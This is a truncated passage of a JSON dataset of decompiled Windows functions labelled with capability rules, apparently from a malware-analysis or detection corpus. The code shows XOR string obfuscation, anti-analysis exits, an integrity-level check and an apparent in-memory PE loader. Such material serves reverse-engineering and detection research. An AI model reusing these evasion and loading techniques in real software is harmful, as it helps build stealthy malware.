0x4b62;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_80h = 6;\n    iVar7 = lpLibFileName;\n    do {\n        puVar1 = iVar9 + iVar7;\n        iVar7 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_18h - lpLibFileName];\n        iVar7 = lpLibFileName;\n    } while (iVar9 < 0xc);\n    var_1ch = 0x5c191b28;\n    var_18h = 0x380f1809;\n    var_14h = 0x220d5f1d;\n    var_10h._0_2_ = 0x3504;\n    var_10h._2_1_ = 6;\n    var_10h._3_1_ = 0x56;\n    var_ch = 0x211e;\n    uStack14 = 0x6b;\n    var_8h = 0x3174746b;\n    var_4h._0_2_ = 0x7668;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    var_7ch = (*pcVar4)(uVar3);\n    iVar7 = 0;\n    do {\n        puVar1 = var_7ch + iVar7;\n        iVar9 = iVar7 % var_80h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_1ch - var_7ch];\n    } while (iVar7 < 0x13);\n    var_1ch = 0x4d1c3913;\n    var_18h = 0x314f331d;\n    var_14h = 0x394b303a;\n    var_10h._0_2_ = 0x4d48;\n    var_10h._2_1_ = 0x4a;\n    var_10h._3_1_ = 0x33;\n    var_ch = 0x3139;\n    var_8h = 0x4d313933;\n    var_4h._0_1_ = 0x30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    pszSrch = (*pcVar4)(uVar3);\n    iVar9 = 0;\n    var_84h = 5;\n    iVar7 = pszSrch;\n    do {\n        puVar1 = iVar9 + iVar7;\n        iVar7 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_1ch - pszSrch];\n        iVar7 = pszSrch;\n    } while (iVar9 < 0x12);\n    var_18h = 0x383f386f;\n    var_14h = 0x4b4b4207;\n    var_10h._0_2_ = 0x624c;\n    var_10h._2_1_ = 0x42;\n    var_10h._3_1_ = 0x38;\n    var_8h = 0x384b3842;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x62);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar9 = (*pcVar4)(uVar3);\n    iVar7 = lpLibFileName;\n    puVar5 = var_7ch;\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar8 = iVar10 % var_84h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_18h - iVar9];\n    } while (iVar10 < 0xc);\n    puVar11 = &var_288h;\n    for (iVar10 = 0x200; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, puVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    (*pcVar4)(lpLibFileName, &var_88h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_24h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    pcVar12 = var_24h;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *pcVar12 = 0x0;\n        pcVar12 = pcVar12 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, var_24h, 0x104);\n    pcVar12 = var_24h;\n    puVar5 = lpLibFileName;\n    *0x41ccc0 = var_24h;\n    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpLibFileName, iVar9);\n    if (iVar7 == 0) goto code_r0x00405567;\n    uVar3 = 0x4df;\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar3);\ncode_r0x00405567:\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(puVar5, pszSrch);\n        if (iVar7 != 0) {\n            fcn.00401b18();\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        puVar5 = fcn.00405b04();\n        (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (puVar5 == 0x1) {\n            fcn.004047ec();\n            uVar3 = (*pcVar4)(0, pcVar12);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        else {\n            var_78h = 0x74297257;\n            var_74h = 0x7222613e;\n            var_70h = 0x612f742c;\n            var_6ch = 0x74297226;\n            var_68h = 0x722e614b;\n            var_64h = 0x61077425;\n            var_60h = 0x741a7211;\n            var_5ch = 0x72016101;\n            var_58h = 0x61087407;\n            var_47h._1_1_ = 6;\n            var_54h = 0x74347206;\n            var_50h = 0x27;\n            var_4fh._0_1_ = 0x61;\n            var_4fh._1_1_ = 0x1c;\n            var_4fh._2_2_ = 0x1c72;\n            var_4bh._0_2_ = 0xb74;\n            var_4bh._2_2_ = 0x61;\n            var_47h._0_1_ = 0x72;\n            stack0xffffffb7 = 0x6610b74;\n            var_41h = 0x72;\n            var_40h = 0x48;\n            var_3fh = 0x2b74;\n            var_3dh._0_2_ = 0xa61;\n            var_3dh._2_2_ = 0x1872;\n            var_39h._0_2_ = 0x274;\n            var_39h._2_2_ = 0x1d61;\n            var_35h._0_2_ = 0x1a72;\n            var_35h._2_2_ = 0xb74;\n            var_31h._0_2_ = 0x61;\n            var_31h._2_2_ = 0x3472;\n            var_2dh._0_2_ = 0x6e74;\n            var_2dh._2_1_ = 0x61;\n            var_8h = 0x74687272;\n            var_4h._0_2_ = 0x616e;\n            uVar3 = (*pcVar4)(8, 0x9d);\n            pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            pszSrch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = 0;\n            iVar7 = pszSrch;\n            do {\n                puVar1 = iVar9 + iVar7;\n                iVar7 = iVar9 % var_80h;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_78h - pszSrch];\n                iVar7 = pszSrch;\n            } while (iVar9 < 0x4e);\n            var_54h = 0x4b177557;\n            var_50h = 0x16;\n            var_4fh._0_1_ = 0x72;\n            var_4fh._1_1_ = 6;\n            var_4fh._2_2_ = 0x3f44;\n            var_4bh._0_2_ = 5999;\n            var_4bh._2_2_ = 0x2975;\n            var_47h._0_1_ = 0x4b;\n            var_47h._1_1_ = 0x3d;\n            stack0xffffffb7 = 0x24441a72;\n            var_41h = 0x6f;\n            var_3fh = 0x6175;\n            var_3dh._0_2_ = 0x334b;\n            var_3dh._2_2_ = 0x2172;\n            var_39h._0_2_ = 0x2a44;\n            var_39h._2_2_ = 0x16f;\n            var_35h._0_2_ = 0x2f75;\n            var_35h._2_2_ = 0x1c4b;\n            var_31h._0_2_ = 0x2972;\n            var_31h._2_2_ = 0x4b44;\n            var_2dh._0_2_ = CONCAT11(var_2dh._1_1_, 0x6f);\n            var_8h = 0x4b447572;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6f);\n            var_40h = var_4fh._1_1_;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            puVar5 = (*pcVar4)(uVar3);\n            iVar7 = 0;\n            do {\n                puVar1 = puVar5 + iVar7;\n                iVar9 = iVar7 % var_84h;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_54h - puVar5];\n                pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            } while (iVar7 < 0x28);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n            puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            lpLibFileName = puVar6;\n            uVar3 = (*pcVar4)(8, 0x208);\n            var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            puVar6 = var_7ch;\n            for (iVar7 = 0x208; pcVar12 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar7 != 0;\n                iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(pszSrch, lpLibFileName, 0x104);\n            (*pcVar12)(puVar5, var_7ch, 0x104);\n            iVar7 = fcn.0040d4b4();\n            if (iVar7 != 0) {\ncode_r0x004057a0:\n                fcn.004057e8();\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c8c3, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                uVar3 = (*pcVar4)(0, lpLibFileName);\n                pcVar12 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar4)(0, var_7ch);\n                (*pcVar12)(uVar3);\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                } while( true );\n            }\n            iVar7 = fcn.00409859();\n            if (iVar7 == 0) goto code_r0x004057a0;\n            fcn.00409450();\n        }\n        uVar3 = 0;\n    } while( true );\n}\n",
        "token_count": 3824
    },
    "004058dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004058dc(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1549
    },
    "00405b04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.00405b04(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    char cVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint8_t *nSubAuthority;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    uint *TokenInformation;\n    uint var_1h;\n    \n    cVar7 = '\\0';\n    var_1h._0_1_ = '\\0';\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar3 == 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap, \n           iVar3 == 0x7a)) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            cVar7 = var_1h;\n            if (TokenInformation != NULL) {\n                var_48h = 0x31332462;\n                var_44h = 0x3b344522;\n                var_40h._0_2_ = 0x421;\n                var_40h._2_1_ = 100;\n                stack0xffffffbf = 0x4202b34;\n                var_3ch._3_1_ = 0x59;\n                var_38h._0_1_ = 0x25;\n                var_38h._1_1_ = 0x33;\n                var_38h._2_2_ = 0xd34;\n                var_34h._0_1_ = 0x37;\n                var_28h = 0x555a5137;\n                var_24h._0_1_ = 0x61;\n                uVar4 = (*pcVar8)(8, 0x16);\n                iVar3 = (*pcVar2)(uVar4);\n                puVar10 = TokenInformation;\n                var_14h = 5;\n                var_18h = iVar3;\n                iVar9 = 0;\n                do {\n                    puVar1 = iVar9 + iVar3;\n                    iVar6 = iVar9 % 5;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_28h + iVar6) ^ puVar1[&var_48h - iVar3];\n                } while (iVar9 < 0x15);\n                iVar9 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, TokenInformation, TokenInformationLength, &TokenInformationLength)\n                ;\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar9 != 0) {\n                    var_48h = 0x3c12311e;\n                    var_44h = 0x3d0b2217;\n                    var_40h._0_2_ = 0x2b0f;\n                    var_20h = 6;\n                    var_40h._2_1_ = 6;\n                    stack0xffffffbf = 0x51262226;\n                    var_3ch._3_1_ = 0x7b;\n                    var_38h._0_1_ = 0x44;\n                    var_38h._1_1_ = 0x4f;\n                    var_30h = 0x4861484d;\n                    var_2ch._0_2_ = 0x4f72;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n                    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                    iVar3 = 0;\n                    var_28h = iVar9;\n                    do {\n                        puVar1 = iVar3 + iVar9;\n                        iVar6 = iVar3 % var_20h;\n                        iVar3 = iVar3 + 1;\n                        *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_48h - iVar9];\n                    } while (iVar3 < 0x12);\n                    nSubAuthority = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if ((nSubAuthority != NULL) && (*nSubAuthority != 0)) {\n                        var_44h = 0x51b121c;\n                        var_40h._0_2_ = 0x231d;\n                        var_40h._2_1_ = 0x16;\n                        stack0xffffffbf = 0xd173202;\n                        var_3ch._3_1_ = 0x14;\n                        var_38h._0_1_ = 0x14;\n                        var_38h._1_1_ = 0x75;\n                        var_38h._2_2_ = 0x4e40;\n                        var_30h = 0x4677664e;\n                        var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x72);\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                        iVar9 = 0;\n                        do {\n                            puVar1 = iVar9 + iVar3;\n                            iVar6 = iVar9 % var_14h;\n                            iVar9 = iVar9 + 1;\n                            *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_44h - iVar3];\n                        } while (iVar9 < 0x10);\n                        puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *nSubAuthority - 1);\n                        iVar9 = var_28h;\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (puVar5 != NULL) {\n                            if (*puVar5 < 0x2000) {\n                                var_1h._0_1_ = '\\x01';\n                            }\n                            else {\n                                var_1h._0_1_ = '\\x03' - (*puVar5 < 0x3000);\n                            }\n                        }\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    }\n                    iVar3 = var_18h;\n                    uVar4 = (*pcVar8)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    puVar10 = TokenInformation;\n                }\n                uVar4 = (*pcVar8)(0, puVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar4 = (*pcVar8)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                cVar7 = var_1h;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar7;\n}\n",
        "token_count": 1848
    },
    "00405de6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405de6(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00405e28;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00405e28:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.0040fc42();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 639
    },
    "00407121": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004071a6)\n// WARNING: Removing unreachable block (ram,0x004071b6)\n// WARNING: Removing unreachable block (ram,0x004071c3)\n// WARNING: Removing unreachable block (ram,0x004071d2)\n// WARNING: Removing unreachable block (ram,0x004071d7)\n// WARNING: Removing unreachable block (ram,0x004071e1)\n// WARNING: Removing unreachable block (ram,0x004071eb)\n// WARNING: Removing unreachable block (ram,0x00407246)\n// WARNING: Removing unreachable block (ram,0x00407264)\n// WARNING: Removing unreachable block (ram,0x0040737a)\n// WARNING: Removing unreachable block (ram,0x00407396)\n// WARNING: Removing unreachable block (ram,0x004073e8)\n// WARNING: Removing unreachable block (ram,0x004073c6)\n// WARNING: Removing unreachable block (ram,0x004073ea)\n\nuint __cdecl fcn.00407121(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    \n    puVar2 = 0x41ccf8;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004077d7();\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    while (*0x41cd2c == 0) {\n        fcn.004077d7();\n        iVar1 = fcn.00407511();\n        if (iVar1 != 0) {\n            fcn.00407fc3();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return 0;\n}\n",
        "token_count": 408
    },
    "00407511": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00407511(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_37h;\n    uint var_33h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint8_t *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_70h = *0x41cd5c;\n    var_64h = *0x41cd3c;\n    var_58h = 0x12543824;\n    var_54h = 0x3222023c;\n    var_50h = 0x8321c5e;\n    var_4ch._0_2_ = 0x3428;\n    var_4ch._2_1_ = 0x58;\n    var_18h = 6;\n    var_4ch._3_1_ = 6;\n    var_48h = 0x2e361628;\n    var_44h = 0x1c2e0042;\n    var_40h = 0x5b19203c;\n    stack0xffffffc1 = 0x3697755;\n    var_37h = 0x7d536f43;\n    var_33h._0_2_ = 0x763;\n    var_33h._2_1_ = 0x76;\n    var_8h = 0x76375a45;\n    var_4h._0_2_ = 0x6459;\n    var_3ch._0_1_ = var_4ch._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_14h = &var_58h - puVar4;\n    do {\n        puVar7 = puVar4 + iVar9;\n        iVar6 = iVar9 % var_18h;\n        iVar9 = iVar9 + 1;\n        *puVar7 = *(&var_8h + iVar6) ^ puVar7[var_14h];\n    } while (iVar9 < 0x28);\n    var_10h = puVar4;\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_18h = 0;\n    var_ch = str.QGFF__;\n    do {\n        var_68h = 0;\n        var_14h = 0;\n        iVar9 = 0;\n        uVar5 = var_ch[var_18h] << 8;\n        var_60h = 1;\n        do {\n            if (uVar5 >> 8 != '\\0') {\n                puVar7 = puVar4;\n                for (uVar5 = uVar5 & 0xffffff00 | *puVar4; uVar5 != uVar5 >> 8; uVar5 = uVar5 & 0xffffff00 | *puVar7) {\n                    if (uVar5 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x00407627;\n                    }\n                    puVar7 = puVar7 + 1;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x00407627:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            stack0xffffffcc = 0x34201764;\n            var_2ch = 0x230c3810;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h = 0x40645625;\n            puVar10 = &var_20h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_24h._0_2_ = 0x5134;\n            var_8h = 0x5150654b;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x62);\n            uVar3 = (*pcVar2)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_6ch = &var_33h + (3 - iVar9);\n            do {\n                var_60h = 5;\n                puVar4 = iVar6 + iVar9;\n                iVar8 = iVar6 % 5;\n                iVar6 = iVar6 + 1;\n                *puVar4 = *(&var_8h + iVar8) ^ 